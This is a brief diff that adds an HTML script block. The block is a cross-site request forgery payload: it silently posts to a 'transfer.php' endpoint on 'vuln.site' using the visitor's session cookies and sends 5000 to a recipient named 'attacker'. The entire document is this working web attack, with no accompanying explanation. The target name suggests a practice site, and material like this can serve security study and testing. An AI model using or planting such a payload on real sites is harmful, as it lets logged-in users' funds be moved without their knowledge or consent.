@@ -1,0 +1,10 @@
+<script>
+fetch("http://vuln.site/transfer.php", {
+  method: "POST",
+  credentials: "include",
+  body: new URLSearchParams({
+    amount: 5000,
+    recipient: "attacker"
+  })
+});
+</script>
